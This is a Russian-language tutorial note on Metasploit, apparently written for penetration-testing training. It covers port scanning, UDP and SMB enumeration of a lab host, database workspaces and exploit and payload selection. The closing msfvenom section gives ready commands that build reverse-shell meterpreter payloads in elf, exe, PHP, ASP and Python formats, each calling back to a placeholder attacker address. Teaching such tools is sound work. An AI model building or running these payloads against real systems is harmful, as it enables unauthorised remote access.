[[Metasploit]]

==🔴Сканирование портов==

Metasploit имеет ряд модулей для сканирования открытых портов в целевой системе и сети. Вы можете вывести список доступных модулей сканирования портов с помощью `search portscan` команды. 

Для работы модулей сканирования портов потребуется установить несколько параметров:

- CONCURRENCY: Количество объектов, которые необходимо сканировать одновременно.
- PORTS: Диапазон портов для сканирования. Обратите внимание, что значения от 1 до 1000 здесь не будут совпадать с использованием Nmap с конфигурацией по умолчанию. Nmap будет сканировать 1000 наиболее часто используемых портов, в то время как Metasploit будет сканировать порты с номерами от 1 до 10000.
- RHOSTS: Цель или целевая сеть для сканирования.
- THREADS: Количество потоков, которые будут использоваться одновременно. Чем больше потоков, тем быстрее будет сканирование.

Вы можете выполнять сканирование Nmap непосредственно из командной строки msfconsole

==🔴Идентификация службы UDP==

`scanner/discovery/udp_sweep` модуль позволит вам быстро идентифицировать службы, работающие поверх UDP. Как видно ниже, этот модуль не будет проводить всестороннее сканирование всех возможных служб UDP, но предоставляет быстрый способ идентификации таких служб, как DNS или NetBIOS.
```
msf6 auxiliary(scanner/discovery/udp_sweep) > run

[*] Sending 13 probes to 10.10.12.229->10.10.12.229 (1 hosts)
[*] Discovered NetBIOS on 10.10.12.229:137 (JON-PC::U :WORKGROUP::G :JON-PC::U :WORKGROUP::G :WORKGROUP::U :__MSBROWSE__::G :02:ce:59:27:c8:e3)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

==🔴Сканирование SMB==

В корпоративной сети особенно полезными будут модули `smb_enumshares` и `smb_version`
```
msf6 auxiliary(scanner/smb/smb_version) > run

[+] 10.10.12.229:445      - Host is running Windows 7 Professional SP1 (build:7601) (name:JON-PC) (workgroup:WORKGROUP ) (signatures:optional)

[*] Auxiliary module execution completed
msf6 auxiliary(scanner/smb/smb_version) > 
```

==🔴База данных Metasploit==

Metasploit имеет функцию работы с базой данных для упрощения управления проектами и предотвращения возможной путаницы при настройке значений параметров.

Сначала вам потребуется запустить базу данных PostgreSQL, которую будет использовать Metasploit, с помощью следующей команды: `systemctl start postgresql`.

Затем вам потребуется инициализировать базу данных Metasploit с помощью `msfdb init` команды. Однако попытка запустить её `msfdb init` от имени root приведёт к следующей ошибке: «Пожалуйста, запустите msfdb от имени пользователя, не являющегося root». Эту проблему можно решить, запустив её от имени postgres учетной записи с помощью команды `sudo -u postgres msfdb init`.

Теперь вы можете запустить `msfconsole` базу данных и проверить её состояние с помощью `db_status` команды.

Функция базы данных позволит вам создавать рабочие пространства для изоляции различных проектов. При первом запуске вы должны находиться в рабочем пространстве по умолчанию. Вы можете вывести список доступных рабочих пространств с помощью команды `workspace`.

Вы можете добавить рабочую область, используя `-a` параметр, или удалить рабочую область, используя `-d` параметр, соответственно. 

В отличие от обычного использования Metasploit, после запуска Metasploit с базой данных `help` , вы увидите меню «Команды бэкендов базы данных».

Если вы запускаете Nmap для сканирования используйте `db_nmap` показанный ниже способ, все результаты будут сохранены в базе данных.

Теперь вы можете получить доступ к информации, относящейся к хостам и службам, работающим в целевых системах, с помощью команд `hosts` и `services` соответственно.

==🔴Сканирование уязвимостей==

Metasploit позволяет быстро выявлять критические уязвимости, которые можно считать «легкодоступными». Термин «легкодоступные» обычно относится к легко обнаруживаемым и эксплуатируемым уязвимостям, которые потенциально могут позволить получить доступ к системе и, в некоторых случаях, получить привилегии высокого уровня, такие как root или администратор.

==🔴Эксплуатация==

Эксплойты — наиболее распространенная категория модулей.
Вы можете искать эксплойты с помощью `search` команды, получать дополнительную информацию об эксплойте с помощью `info` команды и запускать эксплойт с помощью команды `exploit`. Хотя сам процесс прост, помните, что успешный результат зависит от глубокого понимания служб, работающих в целевой системе.

Большинство эксплойтов имеют предустановленную полезную нагрузку по умолчанию. Однако вы всегда можете использовать `show payloads` команду для вывода списка других команд, которые можно использовать с этим конкретным эксплойтом.

После того, как вы определились с полезной нагрузкой, вы можете использовать `set payload` команду для подтверждения своего выбора.

==🔴Msfvenom==, заменивший Msfpayload и Msfencode, позволяет генерировать полезные нагрузки.

Msfvenom предоставит вам доступ ко всем полезным нагрузкам, доступным в Metasploit. Msfvenom позволяет создавать полезные нагрузки во многих различных форматах и для множества различных целевых систем.
```
msfvenom -l payloads
```

Команда `msfvenom --list formats`может использоваться для вывода списка поддерживаемых форматов вывода.

msfvenom позволяет кодировать полезную нагрузку с параметром `-e`.
msfvenom можно использовать для создания полезных нагрузок практически во всех форматах. Ниже приведены несколько примеров, которые вы будете часто использовать:
- Формат исполняемых и компонуемых файлов Linux (elf)  
	`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf`  
	Формат .elf сравним с форматом .exe в Windows. Это исполняемые файлы для Linux.
- Windows  
	`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe`
- PHP  
	`msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php`
- ASP  
	`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp`
- Python  
	`msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py`

Все приведенные выше примеры представляют собой обратные полезные нагрузки. Это означает, что вам потребуется, чтобы модуль exploit/multi/handler работал на вашей атакующей машине в качестве обработчика. Вам нужно будет соответствующим образом настроить обработчик с помощью полезной нагрузки, параметров LHOST и LPORT. Эти значения будут теми же, которые вы использовали при создании полезной нагрузки msfvenom.
